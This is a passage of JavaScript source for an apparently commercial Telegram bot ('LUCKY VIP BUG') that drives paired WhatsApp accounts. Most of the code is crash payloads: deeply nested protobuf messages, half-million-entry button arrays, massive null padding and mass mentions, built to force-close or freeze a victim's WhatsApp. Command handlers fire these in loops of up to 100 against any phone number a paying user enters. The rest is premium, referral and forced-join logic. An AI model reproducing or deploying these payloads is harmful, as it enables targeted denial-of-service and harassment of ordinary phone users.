      }
    };
await client.relayMessage(X, Gren,{ noSelfSync: true });
await client.relayMessage(X, Gren2, {});
}

async function ForcecloseNew(client, X) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(X) ? X : [X])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('jmk: target tidak valid');

    var MAX_BATCH = 5;
    var DELAY_MS  = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId  = 'JMK' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await client.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('jmk: gagal');
}

async function BlankV1(client, target) {
    let RayGroup = {
        interactiveMessage: {
            header: {
                title: "福 | ᥅ᥲᥡᘔᥱ𝗍һ - 𐌊𐌉𐌍𐌂",
                hasMediaAttachment: true,
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/pdf",
                    fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
                    fileLength: 999999999,
                    pageCount: 1000,
                    mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
                    fileName: "file.pdf",
                    fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
                    directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1779839963",
                    thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
                    thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
                    thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
                    jpegThumbnail: null,
                    contextInfo: {},
                    thumbnailHeight: 999,
                    thumbnailWidth: 999
                }
            },
            body: {
                text: "福 | ᥕᥲᥒᥲᥣᥲᥒ ᥉ᥡ᥉𝗍ᥱm ᑲᥙg 𝗀𝗋᥆ᥙρ ¿?"
            },
            nativeFlowMessage: {
                buttons: new Array(500000).fill({})
            }
        }
    };

    let msg = generateWAMessageFromContent(target, RayGroup, {});

    await client.relayMessage(target, msg.message, {
        messageId: msg.key.id
    });
}

async function delayHard1(client, X) {
    const a = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "¡m ⟅༑ ‌‌‌E‌x‌f‌o‌l‌d‌ ‌D‌e‌l‌a‌y ‌h‌a‌r‌d ♞" + "\0".repeat(25000)
                    },
                     nativeFlowmessage: {
                         buttons: "\x10". repeat(3000)
                     }
                }
            }
        }
    };
         const b = {
            groupStatusMessageV2: {
               message: {
                 interactiveMessage: {
                      body: {
                         text: "𐌐𝖚𝗍𝗋𝗂 𝖫𝗈𝗏𝖾𝗋𝗌" + "\n".repeat(5000)
                     },
                      nativeFlowMessage: {
                          buttons: Array.from({ length: 500000 }, () => ({}))
                      }
                 }
             }
         }
     };
        const c = {
          groupStatusMessageV2: {
              message: {
                  extendedTextMessage: {
                      text: "福 | ᥅ᥲᥡᘔᥱ𝗍һ - 𐌊𐌉𐌍𐌂",
                       contextInfo: {
                          mentionedJid: Array.from({    length: 2000 }, () =>
    Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                       )
                   }
                }
            }
        }
    }; 
      await client.relayMessage(X, a, {})
      await client.relayMessage(X, b, {})
      await client.relayMessage(X, c, {
      });
       participant: {
          true
     }
}

async function tableButtonExploit(client, X) {
    try {
        for (let i = 0; i < 30; i++) {
            // 1. Spam text super panjang (delay)
            await client.sendMessage(X, {
                text: "A".repeat(100000) + "B".repeat(100000) + "C".repeat(100000) + " ".repeat(100000)
            });
            await new Promise(r => setTimeout(r, 200));

            // 2. tableMetadata (freeze)
            await client.relayMessage(X, {
                tableMetadata: {
                    title: "Test",
                    rows: [
                        {
                            items: [
                                { text: "a", value: "1" }
                            ],
                            isHeading: true
                        }
                    ]
                }
            }, {});
            await new Promise(r => setTimeout(r, 200));

            // 3. ContactsArrayMessage (freeze)
            await client.relayMessage(X, {
                ContactsArrayMessage: {
                    displayName: "Test",
                    contacts: [
                        {
                            name: "Test",
                            phone: "123"
                        }
                    ]
                }
            }, {});
            await new Promise(r => setTimeout(r, 200));
        }

        console.log("✅ Combo Success!");
    } catch (error) {
        console.error("❌ Error:", error);
    }
} 
      
   
// Respect to admin 
// Comply with applicable regulations 

async function delay(sock, target) {
    const x = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "-x" + "\0".repeat(25000)
                    },
                     nativeFlowmessage: {
                         buttons: "\x10". repeat(3000)
                     }
                }
            }
        }
    };
         const y = {
            groupStatusMessageV2: {
               message: {
                 interactiveMessage: {
                      body: {
                         text: "y" + "\n".repeat(5000)
                     },
                      nativeFlowMessage: {
                          buttons: Array.from({ length: 500000 }, () => ({}))
                      }
                 }
             }
         }
     };
        const z = {
          groupStatusMessageV2: {
              message: {
                  extendedTextMessage: {
                      text: "Nexi",
                       contextInfo: {
                          mentionedJid: Array.from({    length: 2000 }, () =>
    Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                       )
                   }
                }
            }
        }
    }; 
      await sock.relayMessage(target, x, {})
      await sock.relayMessage(target, y, {})
      await sock.relayMessage(target, z, {
      });
       participant: {
          true
     }
}
 

/**
 * kalo mau botnya di buat private ubah disini aja
 * ini gua akses ke publik biar bisa di gunain di channel sama group
 */

bot.use(async (ctx, next) => {
  try {
    await next();
  } catch (err) {
    log.error(`Middleware error: ${err.message}`);
    try {
      await bot.api.sendMessage(
        config.ownerId,
        `An error occurred: ${err.message}`
      );
    } catch {}
  }
});

bot.use(async (ctx, next) => {
  try {
    if (ctx.chat?.type === "private") {
      const userPath = path.join("database", "users.json");
      const users = fs.existsSync(userPath)
        ? JSON.parse(fs.readFileSync(userPath, "utf8"))
        : [];
      const id = ctx.from.id.toString();
      const username = ctx.from.username
        ? `@${ctx.from.username}`
        : ctx.from.first_name || "Unknown";

      if (!users.includes(id)) {
        users.push(id);
        fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
        log.user(`New user registered: ${id} (${username})`);
        try {
          await bot.api.sendDocument(config.ownerId, new InputFile(userPath), {
            caption: `👤 *New User Registered!*\n\n🆔 ID: \`${id}\`\n💬 Username: ${username}\n📅 Time: ${new Date().toLocaleString()}`,
            parse_mode: "Markdown",
          });
        } catch {}
      }
    }
    await next();
  } catch (err) {
    log.error(`Register middleware error: ${err.message}`);
  }
});
bot.use(async (ctx, next) => {
  try {
    // Group messages ko seedha allow karo — channel/join check sirf private mein
    if (!ctx.chat || ctx.chat.type !== "private") return await next();

    // Owner ko membership check se bypass karo (kabhi bhi block na ho)
    if (ctx.from && isOwner(ctx.from.id.toString())) return await next();

    const memberChannel = await ctx.api
      .getChatMember(CHANNEL_ID, ctx.from.id)
      .catch(() => null);
    const memberGroup = await ctx.api
      .getChatMember(GROUP_ID, ctx.from.id)
      .catch(() => null);
    const imageMenu = config.thumburl;

    if (
      !memberChannel ||
      ["left", "kicked"].includes(memberChannel.status) ||
      !memberGroup ||
      ["left", "kicked"].includes(memberGroup.status)
    ) {
      const keyboard = new InlineKeyboard()
        .url("📢 Join Channel", `https://t.me/${CHANNEL_ID.replace("@", "")}`)
        .row()
        .url("📢 Join Group", `https://t.me/${GROUP_ID.replace("@", "")}`)
        .row()
        .url("👥 Join Group", "https://whatsapp.com/channel/0029Vb5e2l2DJ6GxkDjFXg0N");

      return await ctx.replyWithPhoto(imageMenu, {
        caption: `
⚠️ *Ijazat Nahi Hai*

Hello, ${ctx.from.first_name} 👋
Is bot ki tamam features use karne ke liye pehle kuch steps complete karein.

🔐 *Lazmi Sharait*
• Official Channel join karein
• Discussion Group join karein

Tamam steps complete hone ke baad /start bhejein.
Hamara sath dene ka shukriya 🤍
            `.trim(),
        parse_mode: "Markdown",
        reply_markup: keyboard,
      });
    }

    await next();
  } catch (err) {
    log.error(`Cek wajib join error: ${err.message}`);
    // Sirf log karo, dobara next() call na karein (grammY crash hota hai)
  }
});



bot.on("message", async (ctx) => {
  try {
    const msgText = ctx.message.text || "";
    const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
    const userId = ctx.from.id.toString();

    // ─── Group approval check ──────────────────────────────────────────
    if (isGroup && !isGroupApproved(ctx.chat.id)) {
      const rawCmd = (ctx.message.text || "").split(" ")[0].replace("/", "").split("@")[0].toLowerCase();
      const allowedWithoutApproval = ["start", "setgroupsender", "groupsender"];
      if (!isOwner(userId) && !allowedWithoutApproval.includes(rawCmd)) return;
    }
    // ──────────────────────────────────────────────────────────────────

    // ─── Reply Keyboard button handler (sirf private mein) ────────────
    if (!isGroup) {
      const replyButtonMap = {
        "🗂️ MENU BUG":          "open_allmenu",
        "🔐 OWNER BUG":          "open_allaccess",
        "💳 Payment ki Tafseel": "show_payment",
        "🔗 Referral Link":      "/ref",
        "📢 Channel":            null,
        "❓ Help":               "/help",
      };

      if (replyButtonMap.hasOwnProperty(msgText)) {
        const action = replyButtonMap[msgText];
        if (action === null) return;
        if (action.startsWith("/")) {
          ctx.message.text = action;
        } else {
          try { await ctx.deleteMessage(); } catch (_) {}
          return bot.handleUpdate({
            update_id: ctx.update.update_id,
            callback_query: {
              id: String(Date.now()),
              from: ctx.from,
              message: ctx.message,
              chat_instance: String(ctx.chat.id),
              data: action,
            },
          });
        }
      }
    }
    // ──────────────────────────────────────────────────────────────────

    
    // ─── Owner Anywhere Logic ──────────────────────────────────────────
    const normalizedText = msgText.toLowerCase().trim();
    const isOwnerMsg = isOwner(userId);
    const triggers = ["start", "help", "/start", "/help", ".start", ".help"];
    
    if (isOwnerMsg && triggers.includes(normalizedText)) {
      return bot.handleUpdate({
        update_id: ctx.update.update_id,
        callback_query: {
          id: String(Date.now()),
          from: ctx.from,
          message: ctx.message,
          chat_instance: String(ctx.chat.id),
          data: "open_allmenu",
        },
      });
    }
    // ──────────────────────────────────────────────────────────────────

    if (!ctx.message.text || !ctx.message.text.startsWith("/")) return;
    const [command, ...args] = ctx.message.text.slice(1).split(" ");
    const username = ctx.from.username || ctx.from.first_name;
    log.info(
      `Command received: ${chalk.yellow(`/${command}`)} from ${chalk.cyan(
        `@${username}`
      )}`
    ); 
    // Group mein sab members freely commands use kar sakte hain (apna WA connect karke)
    if (!isGroup && !hasAccess(userId)) {
    // Yeh commands free mode mein bhi kaam karein
    const freeAllowed = ["start", "ref", "help"];
    if (!freeAllowed.includes(command)) {
    const freeKeyboard = new InlineKeyboard()
      .text("💳 Payment ki Tafseel", "show_payment")
      .row()
      .url("📞 @luckyhackr", "https://t.me/luckyhackr");
    return ctx.reply(
      "🚫 *Premium Required!*\n\nIs bot ko use karne ke liye pehle premium khareedein.\n\n💰 Neeche button dabao aur payment karein — 5 minute mein active ho jayega!",
      { parse_mode: "Markdown", reply_markup: freeKeyboard }
    );
    }
  }
    switch (command) {
      case "id": {
        const target = ctx.message.reply_to_message ? ctx.message.reply_to_message.from : ctx.from;
        const targetId = target.id.toString();
        const isOwnerMsg = isOwner(userId);
        
        if (!isGroup || isOwnerMsg) {
          return ctx.reply(`👤 *User Information*\n━━━━━━━━━━━━━━━\n🆔 *ID:* \`${targetId}\`\n👤 *Name:* ${target.first_name}${target.username ? ' (@' + target.username + ')' : ''}`, { parse_mode: "Markdown" });
        }
        break;
      }
      case "start": {
        // ─── Group mein /start — same full menu jaisa private ────────
        if (isGroup) {
          const uname = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
          const uptime = formatUptime(process.uptime());
          const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
          const userStatus = isOwner(userId) ? "OWNER" : isReseller(userId) ? "RESELLER" : hasAccess(userId) ? "PREMIUM" : "FREE";

          const groupCaption = `<blockquote>
╔━━━━━━━━━━━━━━━━━━━━━╗
  ⚡ <b>𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 SYSTEM</b>
╚━━━━━━━━━━━━━━━━━━━━━╝

👤 <b>User :</b> <code>${uname}</code>
⚙️ <b>Dev  :</b> @luckyhackr
🕒 <b>Up   :</b> ${uptime}
💾 <b>RAM  :</b> ${usedMemory} MB

┌─────────────────────┐
│  🚀 <b>MAIN NAVIGATION</b>   │
└─────────────────────┘
┃ 🗂️  Bug Menu    → /bugmenu
┃ 🔐  Owner Panel → /ownerpanel

👑 <b>Status :</b> ${userStatus}
━━━━━━━━━━━━━━━━━━━━━━━
📢 <a href="https://t.me/${String(config.chanelid).replace("@", "")}">Official Channel</a>  •  📞 @luckyhackr
━━━━━━━━━━━━━━━━━━━━━━━</blockquote>`.trim();

          const groupKeyboard = new InlineKeyboard()
            .text("🗂️ MENU BUG", "open_allmenu")
            .text("🔐 OWNER BUG", "open_allaccess")
            .row()
            .text("💳 Payment ki Tafseel", "show_payment")
            .row()
            .url("📢 Channel", `https://t.me/${String(config.chanelid).replace("@", "")}`)
            .url("📞 Support", "https://t.me/luckyhackr");

          const imageMenu = config.thumburl;
          if (imageMenu) {
            await ctx.replyWithPhoto(imageMenu, {
              caption: groupCaption,
              parse_mode: "HTML",
              reply_markup: groupKeyboard,
            });
          } else {
            await ctx.reply(groupCaption, {
              parse_mode: "HTML",
              reply_markup: groupKeyboard,
            });
          }
          break;
        }
        // ──────────────────────────────────────────────────────────────

        const username = ctx.from.username
          ? `@${ctx.from.username}`
          : ctx.from.first_name;
        const uptime = formatUptime(process.uptime());
        const usedMemory = (
          process.memoryUsage().heapUsed /
          1024 /
          1024
        ).toFixed(2);

        // ─── Referral link check ───────────────────────────────────────
        const refArg = args[0] || "";
        if (refArg.startsWith("REF")) {
          const refResult = processReferral(ctx.from.id.toString(), refArg);
          if (refResult) {
            const { referrerId, inviteCount } = refResult;
            const needed = referralLimit - inviteCount;
            // Referrer ko notify karo
            try {
              if (needed <= 0 && !referralData[referrerId]?.rewardGiven) {
                giveReferralReward(referrerId);
                await bot.api.sendMessage(referrerId,
                  `🎉 *Mubarak ho!*\n\nAapne ${referralLimit} log invite kar diye!\nAapko *7 din ka Free Premium* mil gaya hai! 🏆`,
                  { parse_mode: "Markdown" }
                );
              } else if (needed > 0) {
                await bot.api.sendMessage(referrerId,
                  `✅ *Naya invite!*\n\nAapke referral link se ek naya user join ho gaya.\n📊 Progress: *${inviteCount}/${referralLimit}*\nAbhi *${needed}* aur chahiye premium ke liye!`,
                  { parse_mode: "Markdown" }
                );
              }
            } catch (_) {}
          }
        }
        // ──────────────────────────────────────────────────────────────

        const caption = `<blockquote>
╔━━━━━━━━━━━━━━━━━━━━━╗
  ⚡ <b>𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 SYSTEM</b>
╚━━━━━━━━━━━━━━━━━━━━━╝

👤 <b>User :</b> <code>${username}</code>
⚙️ <b>Dev  :</b> @luckyhackr
🕒 <b>Up   :</b> ${uptime}
💾 <b>RAM  :</b> ${usedMemory} MB

┌─────────────────────┐
│  🚀 <b>MAIN NAVIGATION</b>   │
└─────────────────────┘
┃ 🗂️  Bug Menu    → MENU BUG
┃ 🔐  Owner Panel → OWNER BUG

━━━━━━━━━━━━━━━━━━━━━━━
📢 <a href="https://t.me/${CHANNEL_ID.replace("@", "")}">Official Channel</a>  •  📞 @luckyhackr
━━━━━━━━━━━━━━━━━━━━━━━</blockquote>`.trim();

        // ─── Premium status check ──────────────────────────────────────
        const uid = ctx.from.id.toString();
        const isOwnerUser = isOwner(uid);
        const isPermanentPremium = loadAccessDb().users.includes(uid);
        const tempPrem = (Array.isArray(premiumUsers) ? premiumUsers : [])
          .find(u => u && u.id === uid && u.expiresAt && new Date(u.expiresAt) > new Date());
        let statusLine = "";
        if (isOwnerUser) {
          statusLine = "\n👑 <b>Status :</b> OWNER";
        } else if (isPermanentPremium) {
          statusLine = "\n🎫 <b>Status :</b> ✅ PERMANENT PREMIUM";
        } else if (tempPrem) {
          const daysLeft = Math.ceil((new Date(tempPrem.expiresAt) - Date.now()) / (1000 * 60 * 60 * 24));
          statusLine = `\n⏳ <b>Status :</b> 🕐 ${daysLeft} din baaki (Referral Premium)`;
        } else {
          statusLine = "\n🚫 <b>Status :</b> FREE MODE";
        }
        // ──────────────────────────────────────────────────────────────

        const inlineKeyboard = new InlineKeyboard()
  .text("🗂️ MENU BUG", "open_allmenu")
  .text("🔐 OWNER BUG", "open_allaccess")
  .row()
  .text("💳 Payment ki Tafseel", "show_payment")
  .row()
  .url("📢 CHANNEL", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

        const finalCaption = caption.replace(
          "━━━━━━━━━━━━━━━━━━━━━━━",
          statusLine + "\n━━━━━━━━━━━━━━━━━━━━━━━"
        );

        const imageMenu = config.thumburl;

        if (imageMenu) {
          await ctx.replyWithPhoto(imageMenu, {
            caption: finalCaption,
            parse_mode: "HTML",
            reply_markup: inlineKeyboard,
          });
        } else {
          await ctx.reply(finalCaption, {
            parse_mode: "HTML",
            reply_markup: inlineKeyboard,
          });
        }

        log.success(`Start command executed for ${username}`);
        break;
      }

      /**
       * contoh command bug
       * sesuaikan dengan style mu aja mau ubah kek mana
       */

      case "clearsender": {
        try {
          const userId = ctx.from.id.toString();
          if (!checkCommandAccess(userId, "clearsender")) {
            return ctx.reply(getNoAccessMessage(userId));
          }

          const confirmMsg = await ctx.reply(
            "⚠️ Khabardar ⚠️\n\nYeh action tamam WhatsApp session data delete kar dega aur bot restart ho jayega.",
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ Haan, Sab Delete Karo",
                      callback_data: "clearsender_confirm",
                    },
                    { text: "❌ Nahi", callback_data: "clearsender_cancel" },
                  ],
                ],
              },
            }
          );
        } catch (err) {
          log.error(`Error in /clearsender for ${userId}: ${err.message}`);
          await ctx.reply("❌ Command mein kharabi aayi.");
        }
        break;
      }
      
      case "lucky-efcenew": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-efcenew AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE\n" +
                "<code>/lucky-efcenew 923xxxxxxxxx</code>\n\n" +
                "<i>EXAMPLE</i> <code>/lucky-efcenew 923xxxz</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT\n" +
                "<code>/reqpair 923xxxx</code>" + groupHint,
                { parse_mode: "HTML" }
            );
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 80; z++) {
         await ForcecloseNew(client, X);
      await jmk(client, X);
      await FcInInd(client, X);
      
                await new Promise(resolve => setImmediate(resolve)); 
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}
case "lucky-goodbye": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-efcenew AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE\n" +
                "<code>/lucky-efcenew 923xxxxxxxxx</code>\n\n" +
                "<i>EXAMPLE</i> <code>/lucky-efcenew 923xxxz</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT\n" +
                "<code>/reqpair 923xxxx</code>" + groupHint,
                { parse_mode: "HTML" }
            );
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 100; z++) {
          await FCNoClickXFrezee(client, X);
          await FcInInd(client, X);
         await ForcecloseNew(client, X);
                await new Promise(resolve => setImmediate(resolve)); 
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}
case "lucky-delayneww": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-efcenew AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE\n" +
                "<code>/lucky-efcenew 923xxxxxxxxx</code>\n\n" +
                "<i>EXAMPLE</i> <code>/lucky-efcenew 923xxxz</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT\n" +
                "<code>/reqpair 923xxxx</code>" + groupHint,
                { parse_mode: "HTML" }
            );
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 100; z++) {
             await delayHard1(client, X);
             await ForcecloseNew(client, X);
                await sleep(900);
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}

case "lucky-fccombo": {
    try {
